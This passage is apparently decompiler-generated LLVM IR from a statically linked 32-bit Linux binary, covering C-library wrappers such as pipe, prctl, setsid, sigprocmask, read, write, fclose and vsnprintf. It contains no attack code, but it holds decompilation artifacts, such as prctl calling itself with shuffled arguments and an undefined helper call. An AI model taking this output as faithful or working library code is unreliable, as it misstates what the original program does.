  %v0_80503f2 = phi i32 [ %v5_80503d7, %dec_label_pc_80503cc ], [ -1, %dec_label_pc_80503e3 ]
  store i32 %v0_80503af, i32* @ebx, align 4
  ret i32 %v0_80503f2

; uselistorder directives
  uselistorder i32 %v5_80503d7, { 1, 0, 2 }
  uselistorder i32 %v4_80503b3, { 1, 0 }
  uselistorder i32 %v0_80503af, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80503ef, { 1, 0 }
  uselistorder label %dec_label_pc_80503cc, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8050407 = inttoptr i32 %arg1 to i8*
  %v4_8050407 = call i32 @__libc_open(i8* %v3_8050407, i32 577)
  ret i32 %v4_8050407
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050410 = load i32, i32* @edi, align 4
  store i32 %v0_8050410, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8050418 = load i32, i32* @ebx, align 4
  %v1_8050420 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_8050420 = call i32 @pipe([2 x i32] %v1_8050420)
  store i32 %v0_8050418, i32* @ebx, align 4
  store i32 %v2_8050420, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8050420, -4095
  br i1 %tmp, label %dec_label_pc_8050438, label %dec_label_pc_805042c

dec_label_pc_805042c:                             ; preds = %entry
  %v1_805042c = call i32 @__errno_location(i32 %v0_8050418)
  %v0_8050431 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050431 = sub i32 0, %v0_8050431
  %v2_8050433 = inttoptr i32 %v1_805042c to i32*
  store i32 %v1_8050431, i32* %v2_8050433, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050438

dec_label_pc_8050438:                             ; preds = %entry, %dec_label_pc_805042c
  %v0_8050439 = phi i32 [ %v2_8050420, %entry ], [ -1, %dec_label_pc_805042c ]
  %v2_805043c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805043c, i32* @edi, align 4
  ret i32 %v0_8050439

; uselistorder directives
  uselistorder i32 %v2_8050420, { 1, 0, 2 }
  uselistorder i32 %v0_8050418, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050438, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8050440 = load i32, i32* @edi, align 4
  %v0_8050441 = load i32, i32* @esi, align 4
  store i32 %v0_8050441, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_8050459 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v5_8050461 = call i32 @prctl(i32 %v0_8050459, i32 %v0_8050441, i32 %v0_8050440, i32 %tmp6, i32 %arg1)
  store i32 %v0_8050459, i32* @ebx, align 4
  store i32 %v5_8050461, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v5_8050461, -4095
  br i1 %tmp, label %dec_label_pc_8050479, label %dec_label_pc_805046d

dec_label_pc_805046d:                             ; preds = %entry
  %v1_805046d = call i32 @__errno_location(i32 %v0_8050459)
  %v0_8050472 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050472 = sub i32 0, %v0_8050472
  %v2_8050474 = inttoptr i32 %v1_805046d to i32*
  store i32 %v1_8050472, i32* %v2_8050474, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050479

dec_label_pc_8050479:                             ; preds = %entry, %dec_label_pc_805046d
  %v0_805047a = phi i32 [ %v5_8050461, %entry ], [ -1, %dec_label_pc_805046d ]
  %v2_805047c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805047c, i32* @esi, align 4
  store i32 %v0_8050440, i32* @edi, align 4
  ret i32 %v0_805047a

; uselistorder directives
  uselistorder i32 %v5_8050461, { 1, 0, 2 }
  uselistorder i32 %v0_8050459, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @prctl, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050479, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050480 = load i32, i32* @edi, align 4
  store i32 %v0_8050480, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8050490 = load i32, i32* @ebx, align 4
  %v4_8050498 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8050490, i32* @ebx, align 4
  store i32 %v4_8050498, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8050498, -4095
  br i1 %tmp, label %dec_label_pc_80504b0, label %dec_label_pc_80504a4

dec_label_pc_80504a4:                             ; preds = %entry
  %v1_80504a4 = call i32 @__errno_location(i32 %v0_8050490)
  %v0_80504a9 = load i32, i32* %edi.global-to-local, align 4
  %v1_80504a9 = sub i32 0, %v0_80504a9
  %v2_80504ab = inttoptr i32 %v1_80504a4 to i32*
  store i32 %v1_80504a9, i32* %v2_80504ab, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80504b0

dec_label_pc_80504b0:                             ; preds = %entry, %dec_label_pc_80504a4
  %v0_80504b1 = phi i32 [ %v4_8050498, %entry ], [ -1, %dec_label_pc_80504a4 ]
  %v2_80504b4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80504b4, i32* @edi, align 4
  ret i32 %v0_80504b1

; uselistorder directives
  uselistorder i32 %v4_8050498, { 1, 0, 2 }
  uselistorder i32 %v0_8050490, { 1, 0 }
  uselistorder label %dec_label_pc_80504b0, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80504b9 = load i32, i32* @esi, align 4
  store i32 %v0_80504b9, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_80504d1 = load i32, i32* @ebx, align 4
  %v1_80504d9 = call i32 @int80_syscall(i32 142)
  store i32 %v0_80504d1, i32* @ebx, align 4
  store i32 %v1_80504d9, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80504d9, -4095
  br i1 %tmp, label %dec_label_pc_80504f1, label %dec_label_pc_80504e5

dec_label_pc_80504e5:                             ; preds = %entry
  %v1_80504e5 = call i32 @__errno_location(i32 %v0_80504d1)
  %v0_80504ea = load i32, i32* %esi.global-to-local, align 4
  %v1_80504ea = sub i32 0, %v0_80504ea
  %v2_80504ec = inttoptr i32 %v1_80504e5 to i32*
  store i32 %v1_80504ea, i32* %v2_80504ec, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80504f1

dec_label_pc_80504f1:                             ; preds = %entry, %dec_label_pc_80504e5
  %v0_80504f2 = phi i32 [ %v1_80504d9, %entry ], [ -1, %dec_label_pc_80504e5 ]
  %v2_80504f1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80504f1, i32* @edx, align 4
  %v2_80504f4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80504f4, i32* @esi, align 4
  ret i32 %v0_80504f2

; uselistorder directives
  uselistorder i32 %v1_80504d9, { 1, 0, 2 }
  uselistorder i32 %v0_80504d1, { 1, 0 }
  uselistorder label %dec_label_pc_80504f1, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80504f8 = load i32, i32* @ebx, align 4
  store i32 %v0_80504f8, i32* %stack_var_-4, align 4
  %v1_8050501 = call i32 @setsid(i32 %v0_80504f8)
  store i32 %v1_8050501, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8050501, -4095
  br i1 %tmp, label %dec_label_pc_8050518, label %dec_label_pc_805050c

dec_label_pc_805050c:                             ; preds = %entry
  %v0_805050c = load i32, i32* %stack_var_-4, align 4
  %v1_805050c = call i32 @__errno_location(i32 %v0_805050c)
  %v0_8050511 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050511 = sub i32 0, %v0_8050511
  %v2_8050513 = inttoptr i32 %v1_805050c to i32*
  store i32 %v1_8050511, i32* %v2_8050513, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050518

dec_label_pc_8050518:                             ; preds = %entry, %dec_label_pc_805050c
  %v0_8050519 = phi i32 [ %v1_8050501, %entry ], [ -1, %dec_label_pc_805050c ]
  %v2_805051c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805051c, i32* @ebx, align 4
  ret i32 %v0_8050519

; uselistorder directives
  uselistorder i32 %v1_8050501, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050518, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_8050521 = load i32, i32* @esi, align 4
  %v4_8050525 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_8050525, i32* @ecx, align 4
  %v2_8050531 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_8050531, label %dec_label_pc_805054a, label %dec_label_pc_8050535

dec_label_pc_8050535:                             ; preds = %entry
  %tmp = icmp ult i32 %arg1, 3
  br i1 %tmp, label %dec_label_pc_805054a, label %dec_label_pc_805053a

dec_label_pc_805053a:                             ; preds = %dec_label_pc_8050535
  %v1_805053a = call i32 @__errno_location(i32 %v0_8050521)
  %v1_805053f = inttoptr i32 %v1_805053a to i32*
  store i32 22, i32* %v1_805053f, align 4
  store i1 false, i1* @of, align 1
  br label %dec_label_pc_8050571

dec_label_pc_805054a:                             ; preds = %dec_label_pc_8050535, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_805054f = load i32, i32* @ebx, align 4
  %v7_8050557 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_805054f, i32* @ebx, align 4
  %v1_805055a = add i32 %v7_8050557, 4096
  %v2_805055a = icmp ult i32 %v7_8050557, -4096
  %v3_805055a = xor i32 %v7_8050557, -2147483648
  %v4_805055a = xor i32 %v1_805055a, %v7_8050557
  %v5_805055a = and i32 %v4_805055a, %v3_805055a
  %v6_805055a = icmp slt i32 %v5_805055a, 0
  store i1 %v6_805055a, i1* @of, align 1
  %v7_805055a = icmp eq i32 %v1_805055a, 0
  store i32 %v7_8050557, i32* %esi.global-to-local, align 4
  %v2_8050561 = or i1 %v2_805055a, %v7_805055a
  br i1 %v2_8050561, label %dec_label_pc_8050571, label %dec_label_pc_8050563

dec_label_pc_8050563:                             ; preds = %dec_label_pc_805054a
  %v1_8050563 = call i32 @__errno_location(i32 %v0_805054f)
  %v0_8050568 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050568 = sub i32 0, %v0_8050568
  %v2_805056a = inttoptr i32 %v1_8050563 to i32*
  store i32 %v1_8050568, i32* %v2_805056a, align 4
  store i1 false, i1* @of, align 1
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050571

dec_label_pc_8050571:                             ; preds = %dec_label_pc_8050563, %dec_label_pc_805054a, %dec_label_pc_805053a
  %storemerge = phi i32 [ -1, %dec_label_pc_805053a ], [ %v7_8050557, %dec_label_pc_805054a ], [ -1, %dec_label_pc_8050563 ]
  %v2_8050571 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050571, i32* @edx, align 4
  store i32 %v0_8050521, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_805055a, { 1, 0 }
  uselistorder i32 %v7_8050557, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v0_805054f, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050578 = load i32, i32* @edi, align 4
  store i32 %v0_8050578, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_8050580 = load i32, i32* @ebx, align 4
  %v2_8050588 = call i32 @time(i32* %arg1)
  store i32 %v0_8050580, i32* @ebx, align 4
  store i32 %v2_8050588, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8050588, -4095
  br i1 %tmp, label %dec_label_pc_80505a0, label %dec_label_pc_8050594

dec_label_pc_8050594:                             ; preds = %entry
  %v1_8050594 = call i32 @__errno_location(i32 %v0_8050580)
  %v0_8050599 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050599 = sub i32 0, %v0_8050599
  %v2_805059b = inttoptr i32 %v1_8050594 to i32*
  store i32 %v1_8050599, i32* %v2_805059b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80505a0

dec_label_pc_80505a0:                             ; preds = %entry, %dec_label_pc_8050594
  %v0_80505a1 = phi i32 [ %v2_8050588, %entry ], [ -1, %dec_label_pc_8050594 ]
  %v2_80505a0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80505a0, i32* @edx, align 4
  %v2_80505a4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80505a4, i32* @edi, align 4
  ret i32 %v0_80505a1

; uselistorder directives
  uselistorder i32 %v2_8050588, { 1, 0, 2 }
  uselistorder i32 %v0_8050580, { 1, 0 }
  uselistorder label %dec_label_pc_80505a0, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_80505b9 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_80505b9
}

define i32 @__libc_write(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80505c4 = load i32, i32* @edi, align 4
  store i32 %v0_80505c4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_80505d4 = load i32, i32* @ebx, align 4
  %v4_80505dc = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_80505d4, i32* @ebx, align 4
  store i32 %v4_80505dc, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_80505dc, -4095
  br i1 %tmp, label %dec_label_pc_80505f4, label %dec_label_pc_80505e8

dec_label_pc_80505e8:                             ; preds = %entry
  %v1_80505e8 = call i32 @__errno_location(i32 %v0_80505d4)
  %v0_80505ed = load i32, i32* %edi.global-to-local, align 4
  %v1_80505ed = sub i32 0, %v0_80505ed
  %v2_80505ef = inttoptr i32 %v1_80505e8 to i32*
  store i32 %v1_80505ed, i32* %v2_80505ef, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80505f4

dec_label_pc_80505f4:                             ; preds = %entry, %dec_label_pc_80505e8
  %v0_80505f5 = phi i32 [ %v4_80505dc, %entry ], [ -1, %dec_label_pc_80505e8 ]
  %v2_80505f4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80505f4, i32* @edx, align 4
  %v2_80505f8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80505f8, i32* @edi, align 4
  ret i32 %v0_80505f5

; uselistorder directives
  uselistorder i32 %v4_80505dc, { 1, 0, 2 }
  uselistorder i32 %v0_80505d4, { 1, 0 }
  uselistorder label %dec_label_pc_80505f4, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8050600 = load i32, i32* inttoptr (i32 134619852 to i32*), align 4
  %v2_8050605 = mul i32 %arg1, 2
  %v3_8050605 = add i32 %v0_8050600, %v2_8050605
  %v4_8050605 = inttoptr i32 %v3_8050605 to i16*
  %v5_8050605 = load i16, i16* %v4_8050605, align 2
  %v6_8050605 = zext i16 %v5_8050605 to i32
  %v1_8050609 = and i32 %v6_8050605, 32
  ret i32 %v1_8050609
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_8050614 = add i32 %arg1, 128
  %v6_805061f = icmp ugt i32 %v1_8050614, 383
  br i1 %v6_805061f, label %dec_label_pc_805062a, label %dec_label_pc_8050621

dec_label_pc_8050621:                             ; preds = %entry
  %v0_8050621 = load i32, i32* inttoptr (i32 134619860 to i32*), align 4
  %v2_8050626 = mul i32 %arg1, 2
  %v3_8050626 = add i32 %v0_8050621, %v2_8050626
  %v4_8050626 = inttoptr i32 %v3_8050626 to i16*
  %v5_8050626 = load i16, i16* %v4_8050626, align 2
  %v6_8050626 = sext i16 %v5_8050626 to i32
  store i32 %v6_8050626, i32* @edx, align 4
  br label %dec_label_pc_805062a

dec_label_pc_805062a:                             ; preds = %entry, %dec_label_pc_8050621
  %v0_805062a = phi i32 [ %arg1, %entry ], [ %v6_8050626, %dec_label_pc_8050621 ]
  ret i32 %v0_805062a

; uselistorder directives
  uselistorder label %dec_label_pc_805062a, { 1, 0 }
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_80687e0.700 to i32)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8050638 = load i32, i32* @ebp, align 4
  %v0_8050639 = load i32, i32* @edi, align 4
  %v0_805063a = load i32, i32* @esi, align 4
  %v0_805063b = load i32, i32* @ebx, align 4
  %v4_805063f = ptrtoint i16* %arg1 to i32
  store i32 %v4_805063f, i32* @esi, align 4
  %v1_8050643 = add i32 %v4_805063f, 52
  %v2_8050643 = inttoptr i32 %v1_8050643 to i32*
  %v3_8050643 = load i32, i32* %v2_8050643, align 4
  store i32 %v3_8050643, i32* @ebp, align 4
  %v1_8050646 = icmp eq i32 %v3_8050643, 0
  %v1_8050648 = icmp eq i1 %v1_8050646, false
  br i1 %v1_8050648, label %dec_label_pc_8050669, label %dec_label_pc_805064a

dec_label_pc_805064a:                             ; preds = %entry
  %v1_805064a = add i32 %v4_805063f, 56
  store i32 %v1_805064a, i32* @ebx, align 4
  %v2_8050654 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050654, i32* @eax, align 4
  %v2_8050659 = call i32 @__pthread_return_void(i32 %v2_8050654, i32 134562299)
  %v0_805065e = load i32, i32* @ebx, align 4
  %v1_8050661 = call i32 @__pthread_return_0(i32 %v0_805065e)
  store i32 %v1_8050661, i32* @eax, align 4
  %v0_805066b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050669

dec_label_pc_8050669:                             ; preds = %entry, %dec_label_pc_805064a
  %v0_8050673 = phi i32 [ %v4_805063f, %entry ], [ %v0_805066b.pre, %dec_label_pc_805064a ]
  store i32 0, i32* @edi, align 4
  %v1_805066b = inttoptr i32 %v0_8050673 to i8*
  %v2_805066b = load i8, i8* %v1_805066b, align 1
  %v3_805066b = and i8 %v2_805066b, 64
  %v4_805066b = icmp eq i8 %v3_805066b, 0
  br i1 %v4_805066b, label %dec_label_pc_8050669.dec_label_pc_805067e_crit_edge, label %dec_label_pc_8050670

dec_label_pc_8050669.dec_label_pc_805067e_crit_edge: ; preds = %dec_label_pc_8050669
  br label %dec_label_pc_805067e

dec_label_pc_8050670:                             ; preds = %dec_label_pc_8050669
  %v1_8050674 = inttoptr i32 %v0_8050673 to i16*
  %v2_8050674 = call i32 @fflush_unlocked(i16* %v1_8050674)
  store i32 %v2_8050674, i32* @edi, align 4
  %v0_8050681.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805067e

dec_label_pc_805067e:                             ; preds = %dec_label_pc_8050669.dec_label_pc_805067e_crit_edge, %dec_label_pc_8050670
  %v0_8050681 = phi i32 [ %v0_8050673, %dec_label_pc_8050669.dec_label_pc_805067e_crit_edge ], [ %v0_8050681.pre, %dec_label_pc_8050670 ]
  %v1_8050681 = add i32 %v0_8050681, 4
  %v2_8050681 = inttoptr i32 %v1_8050681 to i32*
  %v3_8050681 = load i32, i32* %v2_8050681, align 4
  %v1_8050684 = call i32 @__libc_close(i32 %v3_8050681)
  %v0_805068c = load i32, i32* @esi, align 4
  %v1_805068c = add i32 %v0_805068c, 4
  %v2_805068c = inttoptr i32 %v1_805068c to i32*
  store i32 -1, i32* %v2_805068c, align 4
  %v2_805069d = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_805069d, i32* @ebx, align 4
  %v2_80506a2 = icmp slt i32 %v1_8050684, 0
  store i32 -1, i32* @eax, align 4
  %v1_80506a9 = load i32, i32* @edi, align 4
  %v3_80506a9 = select i1 %v2_80506a2, i32 -1, i32 %v1_80506a9
  store i32 %v3_80506a9, i32* @edi, align 4
  %v2_80506ac = call i32 @__pthread_return_void(i32 %v2_805069d, i32 134562299)
  %v1_80506b8 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8062308.701 to i32))
  %v0_80506bd = load i32, i32* @global_var_80665a4.702, align 4
  %v1_80506c2 = add i32 %v0_80506bd, 1
  store i32 %v1_80506c2, i32* @global_var_80665a4.702, align 4
  store i32 ptrtoint (i32* @global_var_8062308.701 to i32), i32* @eax, align 4
  %v2_80506cd = call i32 @__pthread_return_void(i32 %v2_805069d, i32 1)
  %v0_80506d2 = load i32, i32* @esi, align 4
  %v1_80506d2 = inttoptr i32 %v0_80506d2 to i32*
  %v2_80506d2 = load i32, i32* %v1_80506d2, align 4
  %v1_80506d7 = and i32 %v2_80506d2, 24576
  %v1_80506dc = or i32 %v1_80506d7, 48
  store i32 %v1_80506dc, i32* @eax, align 4
  %v1_80506e1 = trunc i32 %v1_80506dc to i16
  %v3_80506e1 = inttoptr i32 %v0_80506d2 to i16*
  store i16 %v1_80506e1, i16* %v3_80506e1, align 2
  br i1 %v1_8050648, label %dec_label_pc_80506f7, label %dec_label_pc_80506e6

dec_label_pc_80506e6:                             ; preds = %dec_label_pc_805067e
  %v2_80506ea = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80506ea, i32* @eax, align 4
  %v2_80506ef = call i32 @__pthread_return_void(i32 %v2_80506ea, i32 1)
  store i32 %v2_80506ef, i32* @eax, align 4
  br label %dec_label_pc_80506f7

dec_label_pc_80506f7:                             ; preds = %dec_label_pc_805067e, %dec_label_pc_80506e6
  %v0_80506f7 = load i32, i32* @esi, align 4
  %v1_80506f7 = add i32 %v0_80506f7, 1
  %v2_80506f7 = inttoptr i32 %v1_80506f7 to i8*
  %v3_80506f7 = load i8, i8* %v2_80506f7, align 1
  %v4_80506f7 = and i8 %v3_80506f7, 64
  %v5_80506f7 = icmp eq i8 %v4_80506f7, 0
  br i1 %v5_80506f7, label %dec_label_pc_805070b, label %dec_label_pc_80506fd

dec_label_pc_80506fd:                             ; preds = %dec_label_pc_80506f7
  %v1_8050700 = add i32 %v0_80506f7, 8
  %v2_8050700 = inttoptr i32 %v1_8050700 to i32*
  %v3_8050700 = load i32, i32* %v2_8050700, align 4
  %v1_8050703 = call i32 @free(i32 %v3_8050700)
  store i32 %v1_8050703, i32* @eax, align 4
  br label %dec_label_pc_805070b

dec_label_pc_805070b:                             ; preds = %dec_label_pc_80506f7, %dec_label_pc_80506fd
  %v2_8050717 = call i32 @__pthread_return_void(i32 %v2_805069d, i32 134562299)
  %v1_8050723 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8062308.701 to i32))
  store i32 ptrtoint (i32* @global_var_8062308.701 to i32), i32* @eax, align 4
  %v0_8050729 = load i32, i32* @global_var_80665a8.703, align 8
  %v1_8050729 = add i32 %v0_8050729, 1
  store i32 %v1_8050729, i32* @global_var_80665a8.703, align 8
  %v2_8050733 = call i32 @__pthread_return_void(i32 %v2_805069d, i32 1)
  %v0_8050738 = call i32 @_stdio_openlist_dec_use()
  %v0_8050740 = load i32, i32* @edi, align 4
  store i32 %v0_805063b, i32* @ebx, align 4
  store i32 %v0_805063a, i32* @esi, align 4
  store i32 %v0_8050639, i32* @edi, align 4
  store i32 %v0_8050638, i32* @ebp, align 4
  ret i32 %v0_8050740

; uselistorder directives
  uselistorder i32 %v2_805069d, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_805070b, { 1, 0 }
  uselistorder label %dec_label_pc_80506f7, { 1, 0 }
  uselistorder label %dec_label_pc_805067e, { 1, 0 }
  uselistorder label %dec_label_pc_8050669, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8050757 = inttoptr i32 %arg2 to i8*
  %v5_8050757 = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_8050757, i32 0, i32 -1)
  ret i32 %v5_8050757
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_8050783 = ptrtoint i32* %stack_var_12 to i32
  %v4_8050796 = inttoptr i32 %arg1 to i8*
  %v5_8050796 = call i32 @__GI_vsnprintf(i8* %v4_8050796, i32 -1, i32 %arg2, i32 %v2_8050783)
  ret i32 %v5_8050796
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80507a0 = load i32, i32* @ebp, align 4
  %v0_80507a1 = load i32, i32* @edi, align 4
  %v0_80507a2 = load i32, i32* @esi, align 4
  %v0_80507a3 = load i32, i32* @ebx, align 4
  store i32 %v0_80507a3, i32* %stack_var_-16, align 4
  %v4_80507a7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80507a7, i32* @esi, align 4
  %v2_80507ab = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  %v2_80507b6 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_80507b6, i32* @ebp, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v1_80507d0 = sub i32 -1, %v4_80507a7
  %v1_80507e3 = call i32 @__stdio_init_mutex(i32 %v2_80507ab)
  %v1_80507f3 = load i32, i32* @edi, align 4
  %tmp = icmp ule i32 %v1_80507d0, %v1_80507f3
  %v5_80507f5 = select i1 %tmp, i32 %v1_80507d0, i32 %v1_80507f3
  store i32 %v5_80507f5, i32* @ebx, align 4
  %v0_80507f8 = load i32, i32* @esi, align 4
  %v3_8050822 = inttoptr i32 %arg3 to i8*
  %v4_8050822 = call i32 @_vfprintf_internal(i32 %v2_80507b6, i8* %v3_8050822, i32 %arg4)
  %v1_805082a = icmp eq i32 %v5_80507f5, 0
  store i32 %v4_8050822, i32* @edx, align 4
  br i1 %v1_805082a, label %dec_label_pc_8050846, label %dec_label_pc_805083f

dec_label_pc_805083f:                             ; preds = %entry
  %stack_var_-80.0 = inttoptr i32 %v0_80507f8 to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_8050849.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050846

dec_label_pc_8050846:                             ; preds = %entry, %dec_label_pc_805083f
  %v0_8050849 = phi i32 [ %v4_8050822, %entry ], [ %v0_8050849.pre, %dec_label_pc_805083f ]
  %v2_805084b = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805084b, i32* @ebx, align 4
  store i32 %v0_80507a2, i32* @esi, align 4
  store i32 %v0_80507a1, i32* @edi, align 4
  store i32 %v0_80507a0, i32* @ebp, align 4
  ret i32 %v0_8050849

; uselistorder directives
  uselistorder i32 %v1_80507f3, { 1, 0 }
  uselistorder i32 %v1_80507d0, { 1, 0 }
  uselistorder label %dec_label_pc_8050846, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050850 = load i32, i32* @ebp, align 4
  %v0_8050851 = load i32, i32* @edi, align 4
  %v0_8050852 = load i32, i32* @esi, align 4
  %v0_8050853 = load i32, i32* @ebx, align 4
  store i32 %v0_8050853, i32* %stack_var_-16, align 4
  %v4_8050857 = ptrtoint i8* %arg2 to i32
